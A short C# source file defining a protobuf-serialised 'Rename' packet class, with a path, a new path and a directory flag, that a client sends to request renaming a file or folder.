using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Rename : IPacket
    {
        public Rename()
        {
        }

        public Rename(string path, string newpath, bool isdir)
        {
            Path = path;
            NewPath = newpath;
            IsDir = isdir;
        }

        [ProtoMember(1)]
        public string Path { get; set; }

        [ProtoMember(2)]
        public string NewPath { get; set; }

        [ProtoMember(3)]
        public bool IsDir { get; set; }

        public void Execute(Client client)
        {
            client.Send<Rename>(this);
        }
    }
}